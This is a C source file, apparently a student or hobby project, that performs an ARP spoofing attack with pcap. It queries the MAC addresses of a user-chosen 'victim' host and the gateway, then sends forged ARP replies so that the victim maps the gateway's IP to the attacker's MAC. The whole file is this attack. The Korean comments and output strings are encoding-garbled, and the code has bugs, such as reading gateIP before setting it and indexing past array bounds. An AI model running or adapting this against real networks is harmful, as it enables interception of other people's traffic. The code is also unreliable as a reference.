#pragma warning (disable:4996)
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include "libnet.h"
#include <Winsock2.h>
#include <pcap.h>

#pragma comment(lib, "IPHLPAPI.lib")

#define ETHERTYPE_ARP 0x0806

int main()
{

	PIP_ADAPTER_INFO Deviceinfo;
	PIP_ADAPTER_INFO Device = NULL;
	DWORD return_value = 0;
	UINT i, j, k;
	ULONG buff = sizeof(IP_ADAPTER_INFO);
	int select;
	int num = 0;
	pcap_if_t *allDevice;
	pcap_if_t *viewDevice;
	pcap_t *selectDevice;
	char errbuf[PCAP_ERRBUF_SIZE];
	UCHAR packetdata[2048];
	ETH_HDR *EH = (ETH_HDR *)packetdata;
	ARP_HDR *AH = (ARP_HDR *)(packetdata + 14);
	ETH_HDR *TempEH;
	ARP_HDR *TempAH;
	char ipstring[4];
	char temp;
	int tempaddr[4];
	const u_char *packet;
	struct pcap_pkthdr hdr;
	bool find = true;

	int myIP[4];
	int gateIP[4];
	int victimIP[4];
	u_int8_t myMAC[ETHER_ADDR_LEN];
	u_int8_t gateMAC[ETHER_ADDR_LEN];
	u_int8_t victimMAC[ETHER_ADDR_LEN];

	// 1. device �˻�
	if ((pcap_findalldevs(&allDevice, errbuf)) == -1)
	{
		printf("��ġ�� �˻��ϴµ� ������ �߻��߽��ϴ�\n");
		printf("������ �������� ������� �ּ���.\n");
		return 0;
	}

	printf("���ͳ� ȯ���� ������ �ּ���(1.����, 2.����) : ");
	scanf("%d", &select);

	viewDevice = allDevice;
	for (num = 1; num < select; num++)
		viewDevice = viewDevice->next;

	// 2. device ����
	selectDevice = pcap_open_live(viewDevice->name, 65536, 0, 1000, errbuf);
	pcap_freealldevs(allDevice);

	// 3. device�κ��� ���� ���
	Deviceinfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (Deviceinfo == NULL)
	{
		printf("���� : �޸𸮸� �Ҵ翡 �����߽��ϴ�\n");
		return -1;
	}

	if (GetAdaptersInfo(Deviceinfo, &buff) == ERROR_BUFFER_OVERFLOW)
	{
		free(Deviceinfo);
		Deviceinfo = (IP_ADAPTER_INFO *)malloc(buff);

		if (Deviceinfo == NULL)
		{
			printf("���� : �޸𸮸� �Ҵ翡 �����߽��ϴ�\n");
			return -1;
		}
	}

	if ((return_value = GetAdaptersInfo(Deviceinfo, &buff)) == NO_ERROR)
	{
		Device = Deviceinfo;

		while (Device)
		{
			if ((Device->IpAddressList.IpAddress.String[0] != '0') && (Device->GatewayList.IpAddress.String[0] != '0'))
				break;
			Device = Device->Next;
		}

		printf("\n------------------------------------------------------------------\n");
		printf(" Device des: \t%s\n", Device->Description);
		printf(" Device Addr: \t");
		for (i = 0; i < Device->AddressLength; i++)
		{
			if (i == (Device->AddressLength - 1))
				printf("%.2X\n", (int)Device->Address[i]);
			else
				printf("%.2X-", Device->Address[i]);
		}

		printf(" IP Address: \t%s\n", Device->IpAddressList.IpAddress.String);
		printf(" Gateway: \t%s\n", Device->GatewayList.IpAddress.String);
		printf("------------------------------------------------------------------\n\n");
	}
	else
		printf("GetAdaptersInfo failed with error: %d\n", return_value);

	memset(packetdata, 0, sizeof(packetdata));

	////////////////////////////////////////////////////
	////////////////////////////////////////////////////
	// victim mac �˾Ƴ��� ���� ��Ŷ����� �����ϱ�
	////////////////////////////////////////////////////
	////////////////////////////////////////////////////

	// set ether_hdr
	for (i = 0; i < 6; i++)
	{
		EH->ether_shost[i] = myMAC[i] = (int)Device->Address[i];
		EH->ether_dhost[i] = 0xFF;
	}
	EH->ether_type = ntohs(ETHERTYPE_ARP);

	memcpy(packetdata, EH, sizeof(ETH_HDR));

	// set arp_hdr
	AH->ar_hrd = ntohs(1);
	AH->ar_pro = ntohs(0x0800);
	AH->ar_hln = 6;
	AH->ar_pln = 4;
	AH->ar_op = ntohs(ARPOP_REQUEST);

	printf("Target IP : ");
	scanf("%d.%d.%d.%d",
		&AH->ar_ti[0],
		&AH->ar_ti[1],
		&AH->ar_ti[2],
		&AH->ar_ti[3]);

	for (i = 0; i < 6; i++)
	{
		AH->ar_sa[i] = (int)Device->Address[i];
		AH->ar_ta[i] = 0x00;
	}

	// get ip addr
	i = 0;
	j = 0;
	k = 0;
	while (1)
	{
		temp = Device->IpAddressList.IpAddress.String[i];
		if (temp == '.')
		{
			tempaddr[k] = atoi(ipstring);
			for (j = 0; j < 4; j++)
				ipstring[j] = 0;
			i++;
			k++;
			j = 0;
			continue;
		}
		else if (temp == '\0')
		{
			tempaddr[k] = atoi(ipstring);
			break;
		}

		ipstring[j] = temp;
		i++;
		j++;
	}
	for (i = 0; i < 4; i++)
	{
		AH->ar_si[i] = tempaddr[i];
		myIP[i] = tempaddr[i];
	}


	memcpy(packetdata + sizeof(ETH_HDR), AH, sizeof(ARP_HDR));
	
	printf("\n");
	while (find)
	{
		if (pcap_sendpacket(selectDevice, (u_char*)packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR))) != 0) //pcap���� ����
			printf("arp error\n");
		printf("sned ARP packet (me -> victim)\n");
		for (i = 0; i < 20; i++)
		{
			packet = pcap_next(selectDevice, &hdr);

			TempEH = (ETH_HDR *)packet;
			TempAH = (ARP_HDR *)(packet + sizeof(ETH_HDR));

			if ((ETHERTYPE_ARP == ntohs(TempEH->ether_type)) && (ntohs(TempAH->ar_op) == ARPOP_REPLY) && (TempAH->ar_si[4] != gateIP[4]))
			{
				find = false;
				printf("victim MAC ��� ����!\n\n");
				break;
			}
		}
	}

	for (i = 0; i < 6; i++)
		victimMAC[i] = TempEH->ether_shost[i];

	memset(packetdata, 0, sizeof(packetdata));


	////////////////////////////////////////////////////
	////////////////////////////////////////////////////
	// ����Ʈ���� mac �˾Ƴ���
	////////////////////////////////////////////////////
	////////////////////////////////////////////////////

	EH = (ETH_HDR *)packetdata;
	AH = (ARP_HDR *)(packetdata + sizeof(ETH_HDR));

	// get gateway addr
	i = 0;
	j = 0;
	k = 0;
	while (1)
	{
		temp = Device->GatewayList.IpAddress.String[i];
		if (temp == '.')
		{
			tempaddr[k] = atoi(ipstring);
			for (j = 0; j < 4; j++)
				ipstring[j] = 0;
			i++;
			k++;
			j = 0;
			continue;
		}
		else if (temp == '\0')
		{
			tempaddr[k] = atoi(ipstring);
			break;
		}

		ipstring[j] = temp;
		i++;
		j++;
	}
	for (i = 0; i < 4; i++)
	{
		gateIP[i] = tempaddr[i];
		victimIP[i] = AH->ar_ti[i];
	}

	// set ether_hdr
	for (i = 0; i < 6; i++)
	{
		EH->ether_shost[i] = myMAC[i];
		EH->ether_dhost[i] = 0xFF;
	}
	EH->ether_type = ntohs(ETHERTYPE_ARP);

	memcpy(packetdata, EH, sizeof(ETH_HDR));

	// set arp_hdr
	AH->ar_hrd = ntohs(1);
	AH->ar_pro = ntohs(0x0800);
	AH->ar_hln = 6;
	AH->ar_pln = 4;
	AH->ar_op = ntohs(ARPOP_REQUEST);
	for (i = 0; i < 6; i++)
	{
		AH->ar_sa[i] = myMAC[i];
		AH->ar_ta[i] = 0x00;
	}
	for (i = 0; i < 4; i++)
	{
		AH->ar_si[i] = myIP[i];
		AH->ar_ti[i] = gateIP[i];
	}

	memcpy(packetdata + sizeof(ETH_HDR), AH, sizeof(ARP_HDR));

	// ��Ŷ ������ mac ������
	find = true;
	while (find)
	{
		if (pcap_sendpacket(selectDevice, (u_char*)packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR))) != 0) //pcap���� ����
			printf("arp error\n");
		printf("sned ARP packet (me -> gateway)\n");
		for (i = 0; i < 20; i++)
		{
			packet = pcap_next(selectDevice, &hdr);

			TempEH = (ETH_HDR *)packet;
			TempAH = (ARP_HDR *)(packet + sizeof(ETH_HDR));

			if ((ETHERTYPE_ARP == ntohs(TempEH->ether_type)) && (ntohs(TempAH->ar_op) == ARPOP_REPLY) && (TempAH->ar_si[4] != gateIP[4]))
			{
				find = false;
				printf("gateway mac ��� ����!\n\n");
				break;
			}
		}
	}

	for (i = 0; i < 6; i++)
		gateMAC[i] = TempEH->ether_shost[i];




	////////////////////////////////////////////////////
	////////////////////////////////////////////////////
	// ������ ARP Reply packet�� victim�� ������
	////////////////////////////////////////////////////
	////////////////////////////////////////////////////

	EH = (ETH_HDR *)packetdata;
	AH = (ARP_HDR *)(packetdata + sizeof(ETH_HDR));

	// set ether_hdr
	for (i = 0; i < 6; i++)
	{
		EH->ether_shost[i] = myMAC[i];
		EH->ether_dhost[i] = victimMAC[i];
	}
	EH->ether_type = ntohs(ETHERTYPE_ARP);

	memcpy(packetdata, EH, sizeof(ETH_HDR));

	// set arp_hdr
	AH->ar_hrd = ntohs(1);
	AH->ar_pro = ntohs(0x0800);
	AH->ar_hln = 6;
	AH->ar_pln = 4;
	AH->ar_op = ntohs(ARPOP_REPLY);
	for (i = 0; i < 6; i++)
	{
		AH->ar_sa[i] = myMAC[i];
		AH->ar_ta[i] = victimMAC[i];
	}
	for (i = 0; i < 4; i++)
	{
		AH->ar_si[i] = gateIP[i];
		AH->ar_ti[i] = victimIP[i];
	}

	memcpy(packetdata + sizeof(ETH_HDR), AH, sizeof(ARP_HDR));

	if (pcap_sendpacket(selectDevice, (u_char*)packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR))) != 0) //pcap���� ����
		printf("arp error\n");
	printf("sned ARP packet (me(gateway) -> victim) ������Ű��\n");
	if (pcap_sendpacket(selectDevice, (u_char*)packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR))) != 0) //pcap���� ����
		printf("arp error\n");
	printf("sned ARP packet (me(gateway) -> victim) ������Ű��\n");

	pcap_close(selectDevice);

	if (Deviceinfo)
		free(Deviceinfo);
	return 0;
}